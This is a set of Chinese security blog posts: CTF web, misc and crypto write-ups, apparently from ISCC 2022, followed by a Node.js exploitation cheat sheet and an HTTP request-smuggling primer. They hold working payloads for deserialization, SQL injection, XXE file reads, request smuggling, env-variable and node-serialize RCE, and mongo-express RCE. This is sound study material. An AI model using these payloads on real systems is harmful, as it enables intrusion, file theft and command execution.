$val===&quot;skiing&quot;?die(&quot;Sorry~&quot;):NULL; &#125; $Step2=True; &#125;&#125;if($Step1 &amp;&amp; Step2)&#123; include &quot;2022flag.php&quot;;echo $flag;&#125;?&gt; 签到题，几个比较简单的trick，不解释了，直接payload： 1?Information=&#123;&quot;year&quot;:&quot;2022,&quot;,&quot;items&quot;:[0,[&quot;1skiing&quot;],&quot;1skiing&quot;]&#125; 爱国敬业好青年-1绝杀，无解。 爱国敬业好青年-2进入题目要输入一个经纬度，问题是爱国敬业好青年住在哪里。结合第一题中存在1.jpg提示我们照片拍摄地点为背景天安门广场，因此填入天安门经纬度，但是弹出了提示： 1flas=icss&#123;Y0u_M@y_FiNd_1_WEONG_eNtrance!!!&#125; 入口错误，查看源码发现/flag，猜测这里才是真正的入口，抓包获取POST的参数并传入/flag中获取flag。 payload： 1lati=116°23′E&amp;langti=39°54′N Pop2022MRCTF的原题，NISACTF也考过，就懒得放源码了，exp如下： 123456789101112131415161718192021&lt;?php class Road_is_Long&#123;public $page;public $string;&#125;class Make_a_Change&#123;public $effort;&#125;class Try_Work_Hard&#123;protected $var;function __construct()&#123;$this-&gt;var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;&#125;$s = new Road_is_Long();$t = new Make_a_Change();$r = new Try_Work_Hard();$t-&gt;effort = $r;$s-&gt;string = $t;$s-&gt;page = $s;var_dump(urlencode(serialize($s))); Easy-SQLsql注入，但是select被过滤了，因此想到之前了解过得select的平替table，表格名为email，注入出邮箱： 1?id=1 union table emails limit 7,1--+ 邮箱名字是一个压缩包名，下载这个压缩包获取index.php的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpinclude &quot;./config.php&quot;;// error_reporting(0);// highlight_file(__FILE__);$conn = mysqli_connect($hostname, $username, $password, $database); if ($conn-&gt;connect_errno) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_errno);&#125; echo &quot;Where is the database?&quot;.&quot;&lt;br&gt;&quot;;echo &quot;try ?id&quot;;function sqlWaf($s)&#123; $filter = &#x27;/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|&quot;|\\^|\\||\\ |\\&#x27;/i&#x27;; if (preg_match($filter,$s)) return False; return True;&#125;if (isset($_GET[&#x27;id&#x27;])) &#123; $id = $_GET[&#x27;id&#x27;]; $sql = &quot;select * from users where id=$id&quot;; $safe = preg_match(&#x27;/select/is&#x27;, $id); if($safe!==0) die(&quot;No select!&quot;); $result = mysqli_query($conn, $sql); if ($result) &#123; $row = mysqli_fetch_array($result); echo &quot;&lt;h3&gt;&quot; . $row[&#x27;username&#x27;] . &quot;&lt;/h3&gt;&lt;br&gt;&quot;; echo &quot;&lt;h3&gt;&quot; . $row[&#x27;passwd&#x27;] . &quot;&lt;/h3&gt;&quot;; &#125; else die(&#x27;&lt;br&gt;Error!&#x27;);&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $username = strval($_POST[&#x27;username&#x27;]); $passwd = strval($_POST[&#x27;passwd&#x27;]); if ( !sqlWaf($passwd) ) die(&#x27;damn hacker&#x27;); $sql = &quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND passwd= &#x27;$&#123;passwd&#125;&#x27;&quot;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; $row = $result-&gt;fetch_assoc(); if ( $row[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; $row[&#x27;passwd&#x27;] ) &#123; if ($row[&#x27;passwd&#x27;] == $passwd) &#123; die($flag); &#125; else &#123; die(&quot;username or passwd wrong, are you admin?&quot;); &#125; &#125; else &#123; die(&quot;wrong user&quot;); &#125; &#125; else &#123; die(&quot;user not exist or wrong passwd&quot;); &#125;&#125;mysqli_close($conn); ?&gt; 审计代码，用username没有被过滤，那就用vlaues注入出flag： 1username=admin&#x27; union values row(10,&#x27;admin&#x27;,1)#&amp;passwd=1 Find me进去一张赛博朋克的图，审查元素发现unser.php，审计源码： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phphighlight_file(__FILE__);class a&#123; public $un0; public $un1; public $un2; public $un3; public $un4; public function __destruct()&#123; if(!empty(this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123; $this -&gt; Givemeanew(); if($this -&gt; un3 === &#x27;unserialize&#x27;)&#123; $this -&gt; yigei(); &#125; else&#123; $this -&gt; giao(); &#125; &#125; &#125; public funtion Givemeanew()&#123; $this -&gt; un4 = new $this-&gt;un0($this -&gt; un1); &#125; public function yigei()&#123; echo &#x27;Your output: &#x27;.$this-&gt;un4; &#125; public function giao()&#123; @eval($this-&gt;un2); &#125; public function __wakeup()&#123; include $this -&gt; un2.&#x27;hint.php&#x27;; &#125;&#125;$data = $_POST[&#x27;data&#x27;];unserialize($data); 这看到Givemeanew这个函数估计就是原生类应用了，exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass a&#123; public $un0; public $un1; public $un2; public $un3; public $un4; public function __destruct()&#123; if(!empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123; $this -&gt; Givemeanew(); if($this -&gt; un3 === &#x27;unserialize&#x27;)&#123; $this -&gt; yigei(); &#125; else&#123; $this -&gt; giao(); &#125; &#125; &#125; public function Givemeanew()&#123; $this -&gt; un4 = new $this-&gt;un0($this -&gt; un1); &#125; public function yigei()&#123; echo &#x27;Your output: &#x27;.$this-&gt;un4; &#125; public function giao()&#123; @eval($this-&gt;un2); &#125; public function __wakeup()&#123; include $this -&gt; un2.&#x27;hint.php&#x27;; &#125;&#125;$a=new a();$a-&gt;un3=&quot;unserialize&quot;;//读取hint内容，知道flag文件开头为f//$a-&gt;un0=&quot;SplFileObject&quot;;//$a-&gt;un1=&quot;php://filter/read=convert.base64-encode/resource=hint.php&quot;;//echo base64_decode(&quot;PD9waHANCiRhID0gJ2ZsYWflnKjlvZPliY3nm67lvZXkuIvku6XlrZfmr41m5byA5aS055qEdHh05LitLOaXoOazleeIhuegtOWHuuadpSc7&quot;);//找到flag所放置的文件//$a-&gt;un0=&#x27;DirectoryIterator&#x27;;//$a-&gt;un1=&#x27;glob://./*f*&#x27;;//读取flag文件$a-&gt;un0=&quot;SplFileObject&quot;;$a-&gt;un1=&quot;flllHL91244ggg-SecR1et.txt&quot;;echo serialize($a); 这是一道代码审计题进入网页后让我们访问/index，访问后页面上只有404，抓包发现cookie中的login为0，改为1后页面中出现了url=127.0.0.1。 那么我们GET传参url，发现一个文件路径：./static/code.txt 访问后是一对emoji，base100解码得到源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556def geneSign(): if(control_key==1): return render_template(&quot;index.html&quot;) else: return &quot;You have not access to this page!&quot;def check_ssrf(url): hostname = urlparse(url).hostname try: if not re.match(&#x27;https?://(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): if not re.match(&#x27;https?://@(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): raise BaseException(&quot;url format error&quot;) if re.match(&#x27;https?://@(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): if judge_ip(hostname): return True return False, &quot;You not get the right clue!&quot; else: ip_address = socket.getaddrinfo(hostname,&#x27;http&#x27;)[0][4][0] if is_inner_ipaddress(ip_address): return False,&quot;inner ip address attack&quot; else: return False, &quot;You not get the right clue!&quot; except BaseException as e: return False, str(e) except: return False, &quot;unknow error&quot;def ip2long(ip_addr): return struct.unpack(&quot;!L&quot;, socket.inet_aton(ip_addr))[0]def is_inner_ipaddress(ip): ip = ip2long(ip) print(ip) return ip2long(&#x27;127.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;10.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long(&#x27;172.16.0.0&#x27;) &gt;&gt; 20 == ip &gt;&gt; 20 or ip2long(&#x27;192.168.0.0&#x27;) &gt;&gt; 16 == ip &gt;&gt; 16 or ip2long(&#x27;0.0.0.0&#x27;) &gt;&gt; 24 == ip &gt;&gt; 24def waf1(ip): forbidden_list = [ &#x27;.&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;7&#x27;] for word in forbidden_list: if ip and word: if word in ip.lower(): return True return Falsedef judge_ip(ip): if(waf1(ip)): return Fasle else: addr = addr.encode(encoding = &quot;utf-8&quot;) ipp = base64.encodestring(addr) ipp = ipp.strip().lower().decode() if(ip==ipp): global control_key control_key = 1 return True else: return False 原来是这里的ip存在过滤，judge_ip()对获取的ip进行了base64加密，并且url中不能含有点且具有格式，因此我们传参： 1?url=http://@MTI3LjAuMC4x 获得两个参数： 1/mti3ljaumc4x 和 a_cookie = aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ== 访问对应网址，阅读代码发现存在xxe攻击，那就构造POST包直接打，这里的用户密码需要猜一下： 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:///app/flag.txt&quot;&gt; ]&gt; &lt;user&gt; &lt;name&gt; &amp;admin; &lt;/name&gt; &lt;password&gt; 123456 &lt;/password&gt;&lt;/user&gt; 发包获取flag。 让我康康！！gunicorn的走私漏洞，之前也是特意学了下http走私，这题的漏洞可以参考这篇文章：Gunicorn 20.0.4 Request Smuggling payload： 1echo -en &quot;GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n&quot; | nc 59.110.159.206 7020 Melody查看源码发现/info，访问后发现只能用Melody浏览器登录，那就更改UA头，查看框架发现为flask，猜测存在ssti。 利用网站给的提示参数发现利用这个参数可以进行ssti，测试一些特殊情况，在?Melody=&#123;&#123;config&#125;&#125;时发现了一个key： 1&#x27;SECRET_KEY&#x27;: &#x27;meldoy-is-so-cute-wawawa!&#x27; 那不出意外是一个flask-session伪造登录，利用工具构造出session以admin的身份登录，登陆后审查元素发现可疑文件/static/real_flag_part.py，查看代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding:utf-8 -*- import pickle import melody import base64 from flask import Flask, Response,request class register: def __init__(self,name,password): self.name = name self.password = password def __eq__(self, other): return type(other) is register and self.name == other.name and self.password == other.password class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module[0:8] == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;],name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name)) def find(s): return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(&#x27;/therealflag&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) def realflag(): if request.method == &#x27;POST&#x27;: try: data = request.form.get(&#x27;melody&#x27;) if b&#x27;R&#x27; in base64.b64decode(data): return &#x27;no reduce&#x27; else: result = find(base64.b64decode(data)) if type(result) is not register: return &#x27;The type is not correct!&#x27; correct = ((result == register(melody.name,melody.password))&amp;(result == register(&quot;melody&quot;,&quot;hug&quot;))) if correct: if session[&#x27;username&#x27;] == &#x27;admin&#x27;: return Response(read(&#x27;./flag.txt&#x27;)) else: return Response(&quot;You&#x27;re not admin!&quot;) except Exception as e: return Response(str(e)) test = register(&#x27;admin&#x27;, &#x27;123456&#x27;) data = base64.b64encode(pickle.dumps(test)).decode() return Response(data) 又见到pickle反序列化了，好像之前有说过要写这个的博客但是到现在还没写（，不过这个反序列化一般难度都不是很高，exp： 1234567891011121314import pickle import base64 class register: def __init__(self,name,password): self.name = name self.password = password def __eq__(self, other): return type(other) is register and self.name == other.name and self.password == other.password flag = register(&quot;melody&quot;,&quot;hug&quot;) a = pickle.dumps(flag) print(base64.b64encode(a)) 把得到的结果以melody参数传参给/therealflag就可以得到flag了。 ping2rce进入网页就是个输入框和一个ping按钮。题目把过滤做的很严格，不可能通过常规手段进行rce。 审查元素中查看信息，发现题目框架是goahead，想到p牛今年1月的一篇文章：GoAhead环境变量注入复现踩坑记这篇文章详细讲述了如何利用goahead来进行环境变量注入，但是我们要如何进行注入呢，这又不得不提到p牛今年2月的一篇文章：我是如何利用环境变量注入执行任意命令 利用环境变量注入进行命令执行，这不是很好的契合了题目的要求吗，那么结合这两篇文章，我们构造请求包： 12345678Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPMContent-Length: 164------WebKitFormBoundarylNDKbe0ngCGdEiPMContent-Disposition: form-data; name=&quot;BASH_FUNC_ping%%&quot;() &#123; cat /flag; &#125;------WebKitFormBoundarylNDKbe0ngCGdEiPM-- 发包后即可获得flag。 MISC冬奥会这题看描述就可以猜出来压缩包密码就是了。首先给了一张图，010改高发现一串unicode，转码后问我们冰墩墩的小伙伴的原型，那就是灯笼。因此这题压缩包密码就是灯笼，解压后图片用notepad打开就是flag。 单板小将苏翊鸣同样也是010改图片高度，有个二维码，扫描后是unicode，转码后问我们中国队在冬奥获得了几枚奖牌，几金几银几铜，那么答案15942就是压缩包密码，解压得到flag。 降维打击打开图片一个屑魔女，foremost分离出一张图，根据题目意思这里应该对那张图片进行降维，不过我们用强大的zsteg可以提取。 提取之后是一串看都看不懂的文字，那么结合屑魔女，这里的文字正是出自魔女之旅，b站大哥已经分析出了对应的文字，直接参考就可以了：《魔女之旅》文字破解·印刷体 翻译出来的玩意就是flag。 真相只有一个下载下来三个文件，首先将stream的请求头修复，改后缀为zip，解压后获取一个压缩包，但是打开这个压缩包需要一个密码。 接下来是一张图片，LSB发现信息passwd 1998/xx/xx，掩码爆破压缩包出来密码是19981111，解压后得到一个流量包。打开流量包提取TFTP对象，发现password.mp3，查看波形图发现摩斯密码，解码为isccmisc。 最后利用这个密码进行snow隐写的提取，获取flag。 藏在星空中的诗-1这题拿了个一血，好题！给了个txt文件、psd文件和压缩包，发现txt中是5行由星星组成的诗，而psd中有两张图，将一张图的不透明度改为100后发现一个有向图，根据图的序号对应的星星诗的行数即为压缩包密码。 用winrar解压后得到密码本，每种星星和一个字母或符号相对应，翻译完整首诗出来的就是flag。 藏在星空中的诗-2只有一个txt文件，里面的内容也是星星，但是看星星的格式： 1\\🌟🌠🌠✴🟉\\🌟🌠🌠★⍣ 一下就让人想到unicode编码，而对应密码本后发现如果将星星对应的unicode编码的最后一位对应替换，就可以得到一串正确的unicode编码，解码就可以得到flag。 隐秘的信息描述中的base64编码就是压缩包密码，解压后是一张图，用stegslove提取LSB，通道RGB000，发现前三行存在可疑信息，将其16进制值转化为2进制，删除头部第一个0之前的所有1，再转成ascii码即可得到flag。 套中套给了一张图和一个压缩包，压缩包是加密的。修复图片文件头，发现png的crc32错误，改高发现flag1。但是这个flag1明显不完整，我们将图片截图扔进stegslove，在Blue0通道发现剩下的隐藏字符。 接下来在图片的hex最后发现一串base64，解码后得到flag2，将两个flag组合起来就是压缩包的密码： 1wELC0m3_T0_tH3_ISCC_Zo2z 压缩包里面是一个密码题，百度发现是ctfwiki2014原题，exp： 123456789101112131415161718192021222324252627pubKey = nbit = len(pubKey)encoded = A = Matrix(ZZ, nbit + 1, nbit + 1)for i in range(nbit): A[i, i] = 1for i in range(nbit): A[i, nbit] = pubKey[i]A[nbit, nbit] = -(encoded)res = A.LLL()for i in range(0, nbit + 1): M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag == True: M = &#x27;&#x27;.join(str(j) for j in M) M = M[:-1] M = hex(int(M, 2))[2:] print(hex(int(M,16))) 跑sage获得flag。 小光学AI感谢人工智能Strl通过脑中训练模型，然后得出大致区间，最后遍历可能数据解决了这一维护后0解的世界难题，exp： 1234567891011121314listt=[]for i in range(1,10): for j in range(1,10): listt.append(i/j)with open(&#x27;./dataplus.txt&#x27;, &#x27;w&#x27;) as f: # 设置文件对象 for a1 in range(20000,40000): for a2 in listt: for a3 in listt: print(&quot;%d：%d：%d&quot;%(a1,a1*a2,a1*a3),file = f) 跑出字典后爆破压缩包即可，后这个非预期解已被修复。 触不可及真的触不可及了，绝杀，无解。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"nodejs常见知识点总结","slug":"nodejs常见知识点总结","date":"2022-05-11T08:23:17.000Z","updated":"2022-05-26T13:46:41.184Z","comments":true,"path":"2022/05/11/nodejs常见知识点总结/","link":"","permalink":"http://example.com/2022/05/11/nodejs%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","excerpt":"前言 不知道这个坑有没有挖，不过这块可以说是知识盲区了，简单安排一下nodejs这块的知识吧。","text":"前言 不知道这个坑有没有挖，不过这块可以说是知识盲区了，简单安排一下nodejs这块的知识吧。 bypass解题时遇到各种各样的过滤总是令人头疼，为了成功bypass，我们需要掌握一定的姿势。 hex最经典的字符串与十六进制等价： 12console.log(&quot;a&quot;===&quot;\\x61&quot;);// true unicodejs中很常见的一种编码方式，和十六进制是类似的： 12console.log(&quot;\\u0061&quot;===&quot;a&quot;);// true 加号拼接ssti中常用的加号拼接放在js中也是可以实现的： 12console.log(&quot;a&quot;+&quot;bc&quot;===&quot;abc&quot;);// true base64很经典的思路，各路语言的绕过都必须有base64： 12eval(Buffer.from(&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;,&#x27;base64&#x27;).toString())//global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;) 模板字符串和c语言中的宏定义比较类似，可以直接嵌入式表达字符串字面量： 1require(&#x27;child_process&#x27;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;curl 127.0.0.1:1234&#x27;) concat连接这个也和ssti常用的一样，用concat函数直接拼接： 1require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;) JS大小写这是个老考点了，就是利用在toUpperCase()中，字符ı会转变为I，字符ſ会变为S，而在toLowerCase()中，字符İ会转变为i，字符K会转变为k。 其实js中还有两个函数方法，toLocaleUpperCase()和toLocaleLowerCase()，这两个函数的作用也是将字符串变为大写或小写。这两个函数与前面两个函数的区别在于，后两个函数在将字符串中所有的字母字符都将被转换为大（小）写的同时，会适应宿主环境的当前区域设置。因此如果语言规则与常规的 Unicode 大小写映射方式冲突，那么结果就会不同。 不过要利用这个漏洞，还是需要前两个函数。 命令执行js的eval()同样也可以执行js语句。而Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令，我们构造这样如下的payload： 123require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;./&#x27;]).stdout.toString()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString() 如果exec或者load这类关键词被过滤，我们除了用上面第二个payload以及bypass之外，还可以用以下方法绕过： fs模块利用fs模块同样也可以做到读取当前目录的文件名，并且可以读取文件： 12require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)require(&#x27;fs&#x27;).readFileSync(&#x27;flag.txt&#x27;,&#x27;utf-8&#x27;) 文件读取如果只是做一些简单的文件读取的话，利用这两个变量即可： 12__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。如果在模块中，返回的值是模块文件的路径。__dirname 表示当前执行脚本所在的目录。 数组利用js中对于数组的利用也是比较多的，毕竟又能报错又能绕过的东西都是我们最喜欢的。 报错利用： 1234567891011121314function LoginController(req, res) &#123; if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123; try &#123; req.body.password = req.body.password.toUpperCase() if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123; return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;) &#125; &#125; catch (__) &#123;&#125; req.session[&#x27;unique_id&#x27;] = randString.generate(16) res.json(&#123;msg: &#x27;ok&#x27;&#125;) &#125; else &#123; res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;) &#125;&#125; 这是hgame2022第四周的一道web题，其中一个考点就是在这个登陆上。阅读代码要求我们输入密码经过大写转换后等于一串小写密码，这显然是不可能的。但是我们注意到这里的异常报错处理机制的catch部分是没有返回值的，这就会带来漏洞，和也是实战中经常会存在的问题。 官方wp给出的payload： 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:&#123;&quot;length&quot;: 16&#125;&#125; 这里也可以利用数组来搞事情，我当时的解法： 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:[&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;,&#x27;A&#x27;]&#125; 绕过利用： 12345678910111213141516171819202122232425var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;xxxxxxx&#x27;; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;); &#125; &#125;);module.exports = router; 数组绕过可以说道的点太多了，这里就简单的讲一个吧，要求输入的两个值长度不相等但是加上flag后的md5值相等。直接利用数组绕过，因为js中两个数组是不能直接用===判断相等的： 1?a[x]=1&amp;b[x]=2 原型链污染挖坑，最近没空研究原型链污染这个nodejs中比较大的一块，先放两篇文章，之后再填：基于原型链的继承深入理解 JavaScript Prototype 污染攻击 ssti这个之前在写ssti那块就讲过了，这里再记一下吧，本质上还是命令执行，不过不是基于eval()了： 1&#123;&#123;&#x27;&#x27;.constructor.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&quot;)()&#125;&#125; CVE接下来总结一些比较经典的关于nodejs的CVE漏洞。 nodejs反序列化漏洞（CVE-2017-5941）前置知识：IIFEIIFE是一个在定义时就会立即执行的js函数，一般写成如下形式： 12(function()&#123; /* code */ &#125;());(function()&#123; /* code */ &#125;)(); 参考链接：IIFE（立即调用函数表达式 &#110;&#111;&#100;&#x65;&#x2d;&#x73;&#101;&#114;&#105;&#x61;&#x6c;&#x69;&#122;&#x65;&#64;&#x30;&#x2e;&#x30;&#x2e;&#x34;中存在反序列化漏洞： 我们发现被框出的这一语句的eval参数是被括号包裹着的，如果我们构造一个形如function()&#123;&#125;()的函数，在反序列化时就会被当中IIEF立即调用执行。也就是不可信输入传递到unserialize()的时候执行任意代码。 创建payload时最好使用同一模块的序列化函数： 1234567serialize = require(&#x27;node-serialize&#x27;);var test = &#123; rce : function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;Payload: \\n&quot; + serialize.serialize(test));//&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125; 为了在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，最终payload如下： 1&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125; 传递给反序列化执行命令： 123var serialize = require(&#x27;node-serialize&#x27;);var payload = &#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\\&#x27;child_process\\&#x27;).exec(\\&#x27;ls /\\&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#x27;;serialize.unserialize(payload); nodejs目录穿越漏洞（CVE-2017-14849）影响版本： Node.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5 漏洞产生的原因就是nodejs8.5.0对目录进行normalize操作时出现了逻辑错误，导致路径向上跳跃时在中间位置添加一些字母就可以时normalize返回对应文件。 例如，…/…/…/foo/…/…/…/…/etc/passwd可以使normalize返回/etc/passwd，但实际上正确结果应该是…/…/…/…/…/…/etc/passwd。 这个漏洞主要应用在一些静态文件服务器上，比如，express在判断path是否超出静态目录范围时，就用到了normalize函数，上述BUG导致normalize函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。 mongo-express rce（CVE-2019-10758）关于沙盒逃逸这块可以讲得东西也很多，这里也没办法具体讲述，总之把payload贴在这里，然后放参考文章就完事了。 payload1： 1curl &#x27;http://localhost:8081/checkValid&#x27; -H &#x27;Authorization: Basic YWRtaW46cGFzcw==&#x27; --data &#x27;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#x27; payload2: 12345node main.jsexploit = &quot;this.constructor.constructor(\\&quot;return process\\&quot;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&quot; var bson = require(&#x27;mongo-express/lib/bson&#x27;)bson.toBSON(exploit) 参考文章：cve-2019-10758 mongo-express rce 漏洞分析 Nodejs Zoombie Package RCEhgame那题markdown的第二部分考的就是这个payload，当时都没见过nodejs然后web就差一题ak。同样也是直接放payload与参考链接，这个参考链接正是当时hgame week4 markdown online的出题人。 payload： 1this.__proto__.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;) 参考文章：Nodejs Zoombie Package RCE 分析 总结简单总结了些node.js的知识点，也算是初步入门了吧，之后面对之前摆烂没做的nodejs的题目也可以去碰下了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"}]},{"title":"http请求走私","slug":"http请求走私","date":"2022-05-08T02:25:32.000Z","updated":"2022-05-08T07:29:12.895Z","comments":true,"path":"2022/05/08/http请求走私/","link":"","permalink":"http://example.com/2022/05/08/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"前言 打比赛碰到了这个知识点，就顺便学习一下，http走私这块如果要考起来难度还是比较高的。","text":"前言 打比赛碰到了这个知识点，就顺便学习一下，http走私这块如果要考起来难度还是比较高的。 漏洞成因http走私与其他web漏洞存在着比较大的不同，因为不同服务器对RFC标准实现的方式与程度都不尽相同，这就导致了对同一个http请求不同服务器可能会有不同的处理结果，因此http走私的payload并不相通。 接下来我们来介绍导致http走私漏洞的两个http1.1协议特性，Keep-Alive和Pipeline： 所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。 有了Keep-Alive之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。 简单来说就是，长连接允许多个请求复用同一个tcp连接，不必每个请求重新建立连接，大大节约了服务器资源，pipline使得http的请求不必等到响应之后在发起，而可以流式得发起请求，请求到达服务端后仍然通过排队的方式进行处理。 当我们向代理服务器发送一个比较模糊的HTTP请求时，由于服务器的实现方式不同（处理te与cl时存在差异），可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 请求方式cl!=0在RFC7231中提到，假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。 这种情况下就有可能会导致走私，比如我们构造如下的请求： 1234567GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n 